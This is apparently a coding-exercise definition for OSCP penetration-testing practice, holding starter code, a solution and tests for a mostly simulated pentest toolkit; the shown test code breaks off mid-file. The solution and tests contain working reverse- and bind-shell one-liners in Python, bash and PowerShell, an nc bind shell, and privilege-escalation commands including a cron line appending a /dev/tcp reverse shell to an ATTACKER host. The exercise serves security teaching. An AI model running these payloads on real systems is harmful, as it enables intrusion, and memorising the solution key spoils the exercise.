import { Task } from '../../../../../../../types';

export const task: Task = {
	slug: 'cert-oscp-prep',
	title: 'OSCP Penetration Testing Practice',
	difficulty: 'hard',
	tags: ['security', 'certification', 'oscp', 'pentest', 'typescript'],
	estimatedTime: '45m',
	isPremium: true,
	youtubeUrl: '',
	description: `Practice OSCP (Offensive Security Certified Professional) concepts through coding.

**OSCP Focus Areas:**

1. **Information Gathering** - Passive and active reconnaissance
2. **Vulnerability Scanning** - Identifying weaknesses
3. **Exploitation** - Gaining access to systems
4. **Post-Exploitation** - Privilege escalation, persistence
5. **Documentation** - Professional reporting

**Your Task:**

Implement a \`PenTestToolkit\` class that simulates penetration testing methodology.`,
	initialCode: `interface Target {
  ip: string;
  hostname?: string;
  os?: 'windows' | 'linux' | 'unknown';
  services: ServiceInfo[];
  vulnerabilities: VulnInfo[];
  accessLevel: 'none' | 'user' | 'root';
}

interface ServiceInfo {
  port: number;
  protocol: 'tcp' | 'udp';
  service: string;
  version?: string;
  banner?: string;
}

interface VulnInfo {
  id: string;
  service: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  exploitable: boolean;
  exploit?: string;
}

interface ExploitResult {
  success: boolean;
  accessGained: 'none' | 'user' | 'root';
  shell?: {
    type: 'reverse' | 'bind';
    port: number;
  };
  loot?: string[];
  errors?: string[];
}

interface PrivEscVector {
  type: 'suid' | 'sudo' | 'kernel' | 'service' | 'cron' | 'password';
  target: string;
  likelihood: 'low' | 'medium' | 'high';
  command?: string;
}

interface PenTestReport {
  target: string;
  executiveSummary: string;
  findings: {
    title: string;
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
    description: string;
    impact: string;
    remediation: string;
    evidence: string[];
  }[];
  attackPath: string[];
  recommendations: string[];
}

class PenTestToolkit {
  private targets: Map<string, Target> = new Map();
  private attackLog: string[] = [];

  // Reconnaissance
  addTarget(ip: string): Target {
    // TODO: Initialize a new target for testing
    return {} as Target;
  }

  simulatePortScan(ip: string, portRange: [number, number]): ServiceInfo[] {
    // TODO: Simulate port scanning
    // Return discovered services based on common ports
    return [];
  }

  fingerprint(ip: string): { os: string; confidence: number } {
    // TODO: OS fingerprinting based on services/banners
    return { os: 'unknown', confidence: 0 };
  }

  // Vulnerability Assessment
  scanForVulnerabilities(ip: string): VulnInfo[] {
    // TODO: Identify vulnerabilities based on services
    return [];
  }

  checkDefaultCredentials(ip: string, service: string): {
    vulnerable: boolean;
    credentials?: { username: string; password: string };
  } {
    // TODO: Check for default/weak credentials
    return { vulnerable: false };
  }

  // Exploitation
  attemptExploit(ip: string, vulnId: string): ExploitResult {
    // TODO: Attempt to exploit a vulnerability
    return {} as ExploitResult;
  }

  generatePayload(type: 'reverse_shell' | 'bind_shell', config: {
    lhost?: string;
    lport: number;
    format: 'python' | 'bash' | 'powershell';
  }): string {
    // TODO: Generate exploit payload
    return '';
  }

  // Post-Exploitation
  enumeratePrivEsc(ip: string): PrivEscVector[] {
    // TODO: Find privilege escalation vectors
    return [];
  }

  attemptPrivilegeEscalation(ip: string, vector: PrivEscVector): {
    success: boolean;
    newAccessLevel: 'user' | 'root';
  } {
    // TODO: Attempt privilege escalation
    return { success: false, newAccessLevel: 'user' };
  }

  extractSensitiveData(ip: string): {
    type: 'password' | 'key' | 'token' | 'config';
    location: string;
    value: string;
  }[] {
    // TODO: Search for sensitive data (post-exploitation)
    return [];
  }

  // Reporting
  generateReport(ip: string): PenTestReport {
    // TODO: Generate professional pentest report
    return {} as PenTestReport;
  }

  getAttackLog(): string[] {
    // TODO: Return chronological attack log
    return [];
  }

  calculateRiskScore(ip: string): {
    score: number;
    breakdown: Record<string, number>;
  } {
    // TODO: Calculate overall risk score
    return { score: 0, breakdown: {} };
  }
}

// Test your implementation
const toolkit = new PenTestToolkit();

// Test 1: Add target
const target = toolkit.addTarget('192.168.1.100');
console.log('Test 1 - Target added:', target.ip === '192.168.1.100');

// Test 2: Port scan
const services = toolkit.simulatePortScan('192.168.1.100', [1, 1024]);
console.log('Test 2 - Port scan:', services.length > 0);

// Test 3: OS fingerprinting
const osInfo = toolkit.fingerprint('192.168.1.100');
console.log('Test 3 - Fingerprint:', osInfo.os !== 'unknown');

// Test 4: Vulnerability scan
const vulns = toolkit.scanForVulnerabilities('192.168.1.100');
console.log('Test 4 - Vuln scan:', vulns.length > 0);

// Test 5: Check default credentials
const credCheck = toolkit.checkDefaultCredentials('192.168.1.100', 'ssh');
console.log('Test 5 - Cred check:', typeof credCheck.vulnerable === 'boolean');

// Test 6: Generate payload
const payload = toolkit.generatePayload('reverse_shell', {
  lhost: '10.10.10.10',
  lport: 4444,
  format: 'python',
});
console.log('Test 6 - Payload generated:', payload.includes('socket'));

// Test 7: Attempt exploit
const exploitResult = toolkit.attemptExploit('192.168.1.100', vulns[0]?.id || 'VULN-001');
console.log('Test 7 - Exploit attempt:', 'success' in exploitResult);

// Test 8: Enumerate priv esc
const privEscVectors = toolkit.enumeratePrivEsc('192.168.1.100');
console.log('Test 8 - PrivEsc enum:', privEscVectors.length >= 0);

// Test 9: Generate report
const report = toolkit.generateReport('192.168.1.100');
console.log('Test 9 - Report generated:', report.target === '192.168.1.100');

// Test 10: Attack log
const log = toolkit.getAttackLog();
console.log('Test 10 - Attack log:', Array.isArray(log));`,
	solutionCode: `interface Target {
  ip: string;
  hostname?: string;
  os?: 'windows' | 'linux' | 'unknown';
  services: ServiceInfo[];
  vulnerabilities: VulnInfo[];
  accessLevel: 'none' | 'user' | 'root';
}

interface ServiceInfo {
  port: number;
  protocol: 'tcp' | 'udp';
  service: string;
  version?: string;
  banner?: string;
}

interface VulnInfo {
  id: string;
  service: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  exploitable: boolean;
  exploit?: string;
}

interface ExploitResult {
  success: boolean;
  accessGained: 'none' | 'user' | 'root';
  shell?: {
    type: 'reverse' | 'bind';
    port: number;
  };
  loot?: string[];
  errors?: string[];
}

interface PrivEscVector {
  type: 'suid' | 'sudo' | 'kernel' | 'service' | 'cron' | 'password';
  target: string;
  likelihood: 'low' | 'medium' | 'high';
  command?: string;
}

interface PenTestReport {
  target: string;
  executiveSummary: string;
  findings: {
    title: string;
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
    description: string;
    impact: string;
    remediation: string;
    evidence: string[];
  }[];
  attackPath: string[];
  recommendations: string[];
}

class PenTestToolkit {
  private targets: Map<string, Target> = new Map();
  private attackLog: string[] = [];

  private log(action: string): void {
    const timestamp = new Date().toISOString();
    this.attackLog.push(\`[\${timestamp}] \${action}\`);
  }

  addTarget(ip: string): Target {
    const target: Target = {
      ip,
      services: [],
      vulnerabilities: [],
      accessLevel: 'none',
    };
    this.targets.set(ip, target);
    this.log(\`Target added: \${ip}\`);
    return target;
  }

  simulatePortScan(ip: string, portRange: [number, number]): ServiceInfo[] {
    const target = this.targets.get(ip);
    if (!target) {
      this.log(\`Port scan failed: Target \${ip} not found\`);
      return [];
    }

    this.log(\`Starting port scan on \${ip} (ports \${portRange[0]}-\${portRange[1]})\`);

    // Simulate common services
    const commonServices: ServiceInfo[] = [
      { port: 21, protocol: 'tcp', service: 'ftp', version: 'vsftpd 2.3.4', banner: '220 (vsFTPd 2.3.4)' },
      { port: 22, protocol: 'tcp', service: 'ssh', version: 'OpenSSH 7.9', banner: 'SSH-2.0-OpenSSH_7.9' },
      { port: 80, protocol: 'tcp', service: 'http', version: 'Apache 2.4.29', banner: 'Apache/2.4.29 (Ubuntu)' },
      { port: 443, protocol: 'tcp', service: 'https', version: 'Apache 2.4.29' },
      { port: 445, protocol: 'tcp', service: 'smb', version: 'Samba 4.7.6', banner: 'Samba 4.7.6-Ubuntu' },
      { port: 3306, protocol: 'tcp', service: 'mysql', version: 'MySQL 5.7.25' },
      { port: 3389, protocol: 'tcp', service: 'rdp', version: 'Microsoft Terminal Services' },
    ];

    // Filter by port range and randomly select some services
    const discoveredServices = commonServices.filter(
      s => s.port >= portRange[0] && s.port <= portRange[1]
    );

    target.services = discoveredServices;
    this.log(\`Port scan complete: Found \${discoveredServices.length} services\`);

    return discoveredServices;
  }

  fingerprint(ip: string): { os: string; confidence: number } {
    const target = this.targets.get(ip);
    if (!target) {
      return { os: 'unknown', confidence: 0 };
    }

    this.log(\`OS fingerprinting on \${ip}\`);

    const services = target.services;
    let linuxScore = 0;
    let windowsScore = 0;

    for (const service of services) {
      const banner = (service.banner || '').toLowerCase();
      const version = (service.version || '').toLowerCase();

      // Linux indicators
      if (banner.includes('ubuntu') || banner.includes('debian') || banner.includes('linux')) {
        linuxScore += 30;
      }
      if (service.service === 'ssh' && version.includes('openssh')) {
        linuxScore += 20;
      }
      if (banner.includes('apache')) {
        linuxScore += 10;
      }
      if (banner.includes('vsftpd')) {
        linuxScore += 15;
      }

      // Windows indicators
      if (banner.includes('windows') || banner.includes('microsoft')) {
        windowsScore += 30;
      }
      if (service.port === 3389) {
        windowsScore += 25;
      }
      if (service.port === 445 && !banner.includes('samba')) {
        windowsScore += 20;
      }
      if (version.includes('iis')) {
        windowsScore += 20;
      }
    }

    let os: 'windows' | 'linux' | 'unknown';
    let confidence: number;

    if (linuxScore > windowsScore && linuxScore > 20) {
      os = 'linux';
      confidence = Math.min(linuxScore / 100, 0.95);
    } else if (windowsScore > linuxScore && windowsScore > 20) {
      os = 'windows';
      confidence = Math.min(windowsScore / 100, 0.95);
    } else {
      os = 'unknown';
      confidence = 0.3;
    }

    target.os = os;
    this.log(\`OS fingerprint result: \${os} (confidence: \${(confidence * 100).toFixed(0)}%)\`);

    return { os, confidence };
  }

  scanForVulnerabilities(ip: string): VulnInfo[] {
    const target = this.targets.get(ip);
    if (!target) {
      return [];
    }

    this.log(\`Vulnerability scanning on \${ip}\`);

    const vulnerabilities: VulnInfo[] = [];

    for (const service of target.services) {
      // Check for known vulnerable versions
      if (service.service === 'ftp' && service.version?.includes('vsftpd 2.3.4')) {
        vulnerabilities.push({
          id: 'VULN-001',
          service: 'ftp',
          severity: 'critical',
          exploitable: true,
          exploit: 'vsftpd_234_backdoor',
        });
      }

      if (service.service === 'ssh' && service.version?.includes('OpenSSH')) {
        const versionMatch = service.version.match(/OpenSSH[_\\s]([0-9.]+)/i);
        if (versionMatch) {
          const version = parseFloat(versionMatch[1]);
          if (version < 7.0) {
            vulnerabilities.push({
              id: 'VULN-002',
              service: 'ssh',
              severity: 'medium',
              exploitable: false,
              exploit: 'CVE-2016-0777',
            });
          }
        }
      }

      if (service.service === 'smb' && service.version?.includes('Samba')) {
        vulnerabilities.push({
          id: 'VULN-003',
          service: 'smb',
          severity: 'high',
          exploitable: true,
          exploit: 'CVE-2017-7494',
        });
      }

      if (service.service === 'http' && service.version?.includes('Apache 2.4.29')) {
        vulnerabilities.push({
          id: 'VULN-004',
          service: 'http',
          severity: 'medium',
          exploitable: true,
          exploit: 'apache_optionsbleed',
        });
      }

      if (service.service === 'mysql') {
        vulnerabilities.push({
          id: 'VULN-005',
          service: 'mysql',
          severity: 'low',
          exploitable: false,
        });
      }
    }

    target.vulnerabilities = vulnerabilities;
    this.log(\`Found \${vulnerabilities.length} vulnerabilities\`);

    return vulnerabilities;
  }

  checkDefaultCredentials(ip: string, service: string): {
    vulnerable: boolean;
    credentials?: { username: string; password: string };
  } {
    this.log(\`Checking default credentials for \${service} on \${ip}\`);

    const defaultCreds: Record<string, { username: string; password: string }[]> = {
      ssh: [
        { username: 'root', password: 'root' },
        { username: 'admin', password: 'admin' },
        { username: 'user', password: 'user' },
      ],
      ftp: [
        { username: 'anonymous', password: '' },
        { username: 'ftp', password: 'ftp' },
      ],
      mysql: [
        { username: 'root', password: '' },
        { username: 'root', password: 'root' },
      ],
      smb: [
        { username: 'guest', password: '' },
        { username: 'admin', password: 'admin' },
      ],
    };

    const creds = defaultCreds[service];
    if (!creds) {
      return { vulnerable: false };
    }

    // Simulate finding default credentials (for educational purposes)
    const found = creds[0];
    if (service === 'ftp' || service === 'smb') {
      this.log(\`Default credentials found for \${service}\`);
      return { vulnerable: true, credentials: found };
    }

    return { vulnerable: false };
  }

  attemptExploit(ip: string, vulnId: string): ExploitResult {
    const target = this.targets.get(ip);
    if (!target) {
      return { success: false, accessGained: 'none', errors: ['Target not found'] };
    }

    const vuln = target.vulnerabilities.find(v => v.id === vulnId);
    if (!vuln) {
      this.log(\`Exploit failed: Vulnerability \${vulnId} not found\`);
      return { success: false, accessGained: 'none', errors: ['Vulnerability not found'] };
    }

    if (!vuln.exploitable) {
      this.log(\`Exploit failed: \${vulnId} is not exploitable\`);
      return { success: false, accessGained: 'none', errors: ['Vulnerability not exploitable'] };
    }

    this.log(\`Attempting exploit: \${vuln.exploit} against \${ip}\`);

    // Simulate exploitation based on vulnerability
    let accessGained: 'none' | 'user' | 'root' = 'none';
    let shell: { type: 'reverse' | 'bind'; port: number } | undefined;
    const loot: string[] = [];

    switch (vuln.exploit) {
      case 'vsftpd_234_backdoor':
        accessGained = 'root';
        shell = { type: 'bind', port: 6200 };
        loot.push('/etc/shadow', '/root/.ssh/id_rsa');
        break;
      case 'CVE-2017-7494':
        accessGained = 'user';
        shell = { type: 'reverse', port: 4444 };
        loot.push('/etc/passwd');
        break;
      case 'apache_optionsbleed':
        accessGained = 'user';
        loot.push('Apache memory leak data');
        break;
      default:
        accessGained = 'user';
    }

    target.accessLevel = accessGained;
    this.log(\`Exploit successful: Gained \${accessGained} access\`);

    return {
      success: true,
      accessGained,
      shell,
      loot,
    };
  }

  generatePayload(type: 'reverse_shell' | 'bind_shell', config: {
    lhost?: string;
    lport: number;
    format: 'python' | 'bash' | 'powershell';
  }): string {
    this.log(\`Generating \${type} payload in \${config.format} format\`);

    const { lhost = '10.10.10.10', lport, format } = config;

    if (type === 'reverse_shell') {
      switch (format) {
        case 'python':
          return \`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\${lhost}",\${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\`;
        case 'bash':
          return \`bash -i >& /dev/tcp/\${lhost}/\${lport} 0>&1\`;
        case 'powershell':
          return \`$client = New-Object System.Net.Sockets.TCPClient('\${lhost}',\${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\`;
      }
    } else {
      switch (format) {
        case 'python':
          return \`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",\${lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])\`;
        case 'bash':
          return \`nc -lvnp \${lport} -e /bin/bash\`;
        case 'powershell':
          return \`$listener = [System.Net.Sockets.TcpListener]\${lport};$listener.Start();$client = $listener.AcceptTcpClient()\`;
      }
    }

    return '';
  }

  enumeratePrivEsc(ip: string): PrivEscVector[] {
    const target = this.targets.get(ip);
    if (!target || target.accessLevel === 'none') {
      return [];
    }

    this.log(\`Enumerating privilege escalation vectors on \${ip}\`);

    const vectors: PrivEscVector[] = [];

    if (target.os === 'linux') {
      // SUID binaries
      vectors.push({
        type: 'suid',
        target: '/usr/bin/find',
        likelihood: 'high',
        command: 'find . -exec /bin/sh \\\\; -quit',
      });

      // Sudo misconfiguration
      vectors.push({
        type: 'sudo',
        target: 'vim',
        likelihood: 'high',
        command: 'sudo vim -c \\'!sh\\'',
      });

      // Kernel exploit
      vectors.push({
        type: 'kernel',
        target: 'DirtyCow (CVE-2016-5195)',
        likelihood: 'medium',
      });

      // Cron job
      vectors.push({
        type: 'cron',
        target: '/etc/cron.d/backup',
        likelihood: 'medium',
        command: 'echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /opt/scripts/backup.sh',
      });

      // Password in files
      vectors.push({
        type: 'password',
        target: '/var/www/html/config.php',
        likelihood: 'low',
      });
    } else if (target.os === 'windows') {
      vectors.push({
        type: 'service',
        target: 'Unquoted Service Path',
        likelihood: 'medium',
      });

      vectors.push({
        type: 'password',
        target: 'Unattend.xml',
        likelihood: 'medium',
      });
    }

    return vectors;
  }

  attemptPrivilegeEscalation(ip: string, vector: PrivEscVector): {
    success: boolean;
    newAccessLevel: 'user' | 'root';
  } {
    const target = this.targets.get(ip);
    if (!target) {
      return { success: false, newAccessLevel: 'user' };
    }

    this.log(\`Attempting privilege escalation via \${vector.type}: \${vector.target}\`);

    // Simulate success based on likelihood
    const successChance = vector.likelihood === 'high' ? 0.8 : vector.likelihood === 'medium' ? 0.5 : 0.2;
    const success = Math.random() < successChance;

    if (success) {
      target.accessLevel = 'root';
      this.log(\`Privilege escalation successful: Gained root access\`);
      return { success: true, newAccessLevel: 'root' };
    }

    this.log(\`Privilege escalation failed\`);
    return { success: false, newAccessLevel: 'user' };
  }

  extractSensitiveData(ip: string): {
    type: 'password' | 'key' | 'token' | 'config';
    location: string;
    value: string;
  }[] {
    const target = this.targets.get(ip);
    if (!target || target.accessLevel === 'none') {
      return [];
    }

    this.log(\`Extracting sensitive data from \${ip}\`);

    const data: { type: 'password' | 'key' | 'token' | 'config'; location: string; value: string }[] = [];

    if (target.accessLevel === 'root' || target.accessLevel === 'user') {
      data.push({
        type: 'config',
        location: '/var/www/html/config.php',
        value: "db_password = 'secretpass123'",
      });

      data.push({
        type: 'password',
        location: '/home/user/.bash_history',
        value: 'mysql -u root -pAdmin@123',
      });
    }

    if (target.accessLevel === 'root') {
      data.push({
        type: 'key',
        location: '/root/.ssh/id_rsa',
        value: '-----BEGIN RSA PRIVATE KEY-----\\n[REDACTED]',
      });

      data.push({
        type: 'password',
        location: '/etc/shadow',
        value: 'root:$6$rounds=5000$saltsalt$[HASH]',
      });

      data.push({
        type: 'token',
        location: '/opt/app/.env',
        value: 'API_KEY=sk-1234567890abcdef',
      });
    }

    return data;
  }

  generateReport(ip: string): PenTestReport {
    const target = this.targets.get(ip);
    if (!target) {
      return {
        target: ip,
        executiveSummary: 'Target not found',
        findings: [],
        attackPath: [],
        recommendations: [],
      };
    }

    this.log(\`Generating penetration test report for \${ip}\`);

    const criticalCount = target.vulnerabilities.filter(v => v.severity === 'critical').length;
    const highCount = target.vulnerabilities.filter(v => v.severity === 'high').length;

    const findings = target.vulnerabilities.map(vuln => ({
      title: \`\${vuln.service.toUpperCase()} - \${vuln.id}\`,
      severity: vuln.severity as 'critical' | 'high' | 'medium' | 'low' | 'info',
      description: \`Vulnerability found in \${vuln.service} service\`,
      impact: vuln.severity === 'critical'
        ? 'Complete system compromise possible'
        : vuln.severity === 'high'
        ? 'Significant security impact'
        : 'Limited security impact',
      remediation: vuln.exploitable
        ? \`Patch \${vuln.service} immediately and review access controls\`
        : \`Update \${vuln.service} to latest version\`,
      evidence: [
        \`Service: \${vuln.service}\`,
        \`Exploitable: \${vuln.exploitable}\`,
        vuln.exploit ? \`Exploit: \${vuln.exploit}\` : '',
      ].filter(e => e),
    }));

    const attackPath: string[] = [];
    if (target.accessLevel !== 'none') {
      attackPath.push(\`1. Initial reconnaissance identified \${target.services.length} services\`);
      attackPath.push(\`2. Vulnerability scan found \${target.vulnerabilities.length} vulnerabilities\`);
      if (target.accessLevel === 'user' || target.accessLevel === 'root') {
        attackPath.push(\`3. Exploited vulnerability to gain initial access\`);
      }
      if (target.accessLevel === 'root') {
        attackPath.push(\`4. Escalated privileges to root/administrator\`);
      }
    }

    const recommendations = [
      'Implement regular vulnerability scanning and patch management',
      'Enable network segmentation to limit lateral movement',
      'Deploy intrusion detection systems (IDS/IPS)',
      'Implement least privilege access controls',
      'Enable comprehensive logging and monitoring',
    ];

    if (criticalCount > 0) {
      recommendations.unshift('URGENT: Address critical vulnerabilities immediately');
    }

    return {
      target: ip,
      executiveSummary: \`Penetration test of \${ip} identified \${target.vulnerabilities.length} vulnerabilities (\${criticalCount} critical, \${highCount} high). \${target.accessLevel === 'root' ? 'Full system compromise was achieved.' : target.accessLevel === 'user' ? 'User-level access was obtained.' : 'No access was gained.'}\`,
      findings,
      attackPath,
      recommendations,
    };
  }

  getAttackLog(): string[] {
    return [...this.attackLog];
  }

  calculateRiskScore(ip: string): {
    score: number;
    breakdown: Record<string, number>;
  } {
    const target = this.targets.get(ip);
    if (!target) {
      return { score: 0, breakdown: {} };
    }

    const breakdown: Record<string, number> = {
      critical_vulns: 0,
      high_vulns: 0,
      medium_vulns: 0,
      low_vulns: 0,
      access_level: 0,
      exploitable: 0,
    };

    for (const vuln of target.vulnerabilities) {
      switch (vuln.severity) {
        case 'critical':
          breakdown.critical_vulns += 25;
          break;
        case 'high':
          breakdown.high_vulns += 15;
          break;
        case 'medium':
          breakdown.medium_vulns += 8;
          break;
        case 'low':
          breakdown.low_vulns += 3;
          break;
      }

      if (vuln.exploitable) {
        breakdown.exploitable += 10;
      }
    }

    switch (target.accessLevel) {
      case 'root':
        breakdown.access_level = 30;
        break;
      case 'user':
        breakdown.access_level = 15;
        break;
    }

    const score = Math.min(
      100,
      Object.values(breakdown).reduce((a, b) => a + b, 0)
    );

    return { score, breakdown };
  }
}

// Test your implementation
const toolkit = new PenTestToolkit();

// Test 1: Add target
const target = toolkit.addTarget('192.168.1.100');
console.log('Test 1 - Target added:', target.ip === '192.168.1.100');

// Test 2: Port scan
const services = toolkit.simulatePortScan('192.168.1.100', [1, 1024]);
console.log('Test 2 - Port scan:', services.length > 0);

// Test 3: OS fingerprinting
const osInfo = toolkit.fingerprint('192.168.1.100');
console.log('Test 3 - Fingerprint:', osInfo.os !== 'unknown');

// Test 4: Vulnerability scan
const vulns = toolkit.scanForVulnerabilities('192.168.1.100');
console.log('Test 4 - Vuln scan:', vulns.length > 0);

// Test 5: Check default credentials
const credCheck = toolkit.checkDefaultCredentials('192.168.1.100', 'ssh');
console.log('Test 5 - Cred check:', typeof credCheck.vulnerable === 'boolean');

// Test 6: Generate payload
const payload = toolkit.generatePayload('reverse_shell', {
  lhost: '10.10.10.10',
  lport: 4444,
  format: 'python',
});
console.log('Test 6 - Payload generated:', payload.includes('socket'));

// Test 7: Attempt exploit
const exploitResult = toolkit.attemptExploit('192.168.1.100', vulns[0]?.id || 'VULN-001');
console.log('Test 7 - Exploit attempt:', 'success' in exploitResult);

// Test 8: Enumerate priv esc
const privEscVectors = toolkit.enumeratePrivEsc('192.168.1.100');
console.log('Test 8 - PrivEsc enum:', privEscVectors.length >= 0);

// Test 9: Generate report
const report = toolkit.generateReport('192.168.1.100');
console.log('Test 9 - Report generated:', report.target === '192.168.1.100');

// Test 10: Attack log
const log = toolkit.getAttackLog();
console.log('Test 10 - Attack log:', Array.isArray(log));`,
	testCode: `import { describe, it, expect, beforeEach } from 'vitest';

interface Target {
  ip: string;
  hostname?: string;
  os?: 'windows' | 'linux' | 'unknown';
  services: ServiceInfo[];
  vulnerabilities: VulnInfo[];
  accessLevel: 'none' | 'user' | 'root';
}

interface ServiceInfo {
  port: number;
  protocol: 'tcp' | 'udp';
  service: string;
  version?: string;
  banner?: string;
}

interface VulnInfo {
  id: string;
  service: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  exploitable: boolean;
  exploit?: string;
}

interface ExploitResult {
  success: boolean;
  accessGained: 'none' | 'user' | 'root';
  shell?: { type: 'reverse' | 'bind'; port: number };
  loot?: string[];
  errors?: string[];
}

interface PrivEscVector {
  type: 'suid' | 'sudo' | 'kernel' | 'service' | 'cron' | 'password';
  target: string;
  likelihood: 'low' | 'medium' | 'high';
  command?: string;
}

interface PenTestReport {
  target: string;
  executiveSummary: string;
  findings: { title: string; severity: 'critical' | 'high' | 'medium' | 'low' | 'info'; description: string; impact: string; remediation: string; evidence: string[] }[];
  attackPath: string[];
  recommendations: string[];
}

class PenTestToolkit {
  private targets: Map<string, Target> = new Map();
  private attackLog: string[] = [];

  private log(action: string): void {
    const timestamp = new Date().toISOString();
    this.attackLog.push(\`[\${timestamp}] \${action}\`);
  }

  addTarget(ip: string): Target {
    const target: Target = { ip, services: [], vulnerabilities: [], accessLevel: 'none' };
    this.targets.set(ip, target);
    this.log(\`Target added: \${ip}\`);
    return target;
  }

  simulatePortScan(ip: string, portRange: [number, number]): ServiceInfo[] {
    const target = this.targets.get(ip);
    if (!target) { this.log(\`Port scan failed: Target \${ip} not found\`); return []; }

    this.log(\`Starting port scan on \${ip} (ports \${portRange[0]}-\${portRange[1]})\`);

    const commonServices: ServiceInfo[] = [
      { port: 21, protocol: 'tcp', service: 'ftp', version: 'vsftpd 2.3.4', banner: '220 (vsFTPd 2.3.4)' },
      { port: 22, protocol: 'tcp', service: 'ssh', version: 'OpenSSH 7.9', banner: 'SSH-2.0-OpenSSH_7.9' },
      { port: 80, protocol: 'tcp', service: 'http', version: 'Apache 2.4.29', banner: 'Apache/2.4.29 (Ubuntu)' },
      { port: 443, protocol: 'tcp', service: 'https', version: 'Apache 2.4.29' },
      { port: 445, protocol: 'tcp', service: 'smb', version: 'Samba 4.7.6', banner: 'Samba 4.7.6-Ubuntu' },
      { port: 3306, protocol: 'tcp', service: 'mysql', version: 'MySQL 5.7.25' },
    ];

    const discoveredServices = commonServices.filter(s => s.port >= portRange[0] && s.port <= portRange[1]);
    target.services = discoveredServices;
    this.log(\`Port scan complete: Found \${discoveredServices.length} services\`);
    return discoveredServices;
  }

  fingerprint(ip: string): { os: string; confidence: number } {
    const target = this.targets.get(ip);
    if (!target) return { os: 'unknown', confidence: 0 };

    this.log(\`OS fingerprinting on \${ip}\`);

    let linuxScore = 0, windowsScore = 0;
    for (const service of target.services) {
      const banner = (service.banner || '').toLowerCase();
      if (banner.includes('ubuntu') || banner.includes('linux')) linuxScore += 30;
      if (service.service === 'ssh') linuxScore += 20;
      if (banner.includes('apache')) linuxScore += 10;
      if (banner.includes('windows') || banner.includes('microsoft')) windowsScore += 30;
      if (service.port === 3389) windowsScore += 25;
    }

    let os: 'windows' | 'linux' | 'unknown';
    let confidence: number;
    if (linuxScore > windowsScore && linuxScore > 20) { os = 'linux'; confidence = Math.min(linuxScore / 100, 0.95); }
    else if (windowsScore > linuxScore && windowsScore > 20) { os = 'windows'; confidence = Math.min(windowsScore / 100, 0.95); }
    else { os = 'unknown'; confidence = 0.3; }

    target.os = os;
    return { os, confidence };
  }

  scanForVulnerabilities(ip: string): VulnInfo[] {
    const target = this.targets.get(ip);
    if (!target) return [];

    this.log(\`Vulnerability scanning on \${ip}\`);
    const vulnerabilities: VulnInfo[] = [];

    for (const service of target.services) {
      if (service.service === 'ftp' && service.version?.includes('vsftpd 2.3.4')) {
        vulnerabilities.push({ id: 'VULN-001', service: 'ftp', severity: 'critical', exploitable: true, exploit: 'vsftpd_234_backdoor' });
      }
      if (service.service === 'smb') {
        vulnerabilities.push({ id: 'VULN-003', service: 'smb', severity: 'high', exploitable: true, exploit: 'CVE-2017-7494' });
      }
      if (service.service === 'http' && service.version?.includes('Apache 2.4.29')) {
        vulnerabilities.push({ id: 'VULN-004', service: 'http', severity: 'medium', exploitable: true, exploit: 'apache_optionsbleed' });
      }
    }

    target.vulnerabilities = vulnerabilities;
    return vulnerabilities;
  }

  checkDefaultCredentials(ip: string, service: string): { vulnerable: boolean; credentials?: { username: string; password: string } } {
    this.log(\`Checking default credentials for \${service} on \${ip}\`);
    const defaultCreds: Record<string, { username: string; password: string }[]> = {
      ftp: [{ username: 'anonymous', password: '' }],
      smb: [{ username: 'guest', password: '' }],
    };
    const creds = defaultCreds[service];
    if (creds && (service === 'ftp' || service === 'smb')) return { vulnerable: true, credentials: creds[0] };
    return { vulnerable: false };
  }

  attemptExploit(ip: string, vulnId: string): ExploitResult {
    const target = this.targets.get(ip);
    if (!target) return { success: false, accessGained: 'none', errors: ['Target not found'] };

    const vuln = target.vulnerabilities.find(v => v.id === vulnId);
    if (!vuln) return { success: false, accessGained: 'none', errors: ['Vulnerability not found'] };
    if (!vuln.exploitable) return { success: false, accessGained: 'none', errors: ['Vulnerability not exploitable'] };

    this.log(\`Attempting exploit: \${vuln.exploit} against \${ip}\`);

    let accessGained: 'none' | 'user' | 'root' = 'none';
    let shell: { type: 'reverse' | 'bind'; port: number } | undefined;
    const loot: string[] = [];

    if (vuln.exploit === 'vsftpd_234_backdoor') {
      accessGained = 'root'; shell = { type: 'bind', port: 6200 }; loot.push('/etc/shadow');
    } else if (vuln.exploit === 'CVE-2017-7494') {
      accessGained = 'user'; shell = { type: 'reverse', port: 4444 };
    } else {
      accessGained = 'user';
    }

    target.accessLevel = accessGained;
    return { success: true, accessGained, shell, loot };
  }

  generatePayload(type: 'reverse_shell' | 'bind_shell', config: { lhost?: string; lport: number; format: 'python' | 'bash' | 'powershell' }): string {
    const { lhost = '10.10.10.10', lport, format } = config;
    if (type === 'reverse_shell') {
      if (format === 'python') return \`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\${lhost}",\${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\`;
      if (format === 'bash') return \`bash -i >& /dev/tcp/\${lhost}/\${lport} 0>&1\`;
      if (format === 'powershell') return \`$client = New-Object System.Net.Sockets.TCPClient('\${lhost}',\${lport})\`;
    }
    if (format === 'python') return \`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",\${lport}))\`;
    return '';
  }
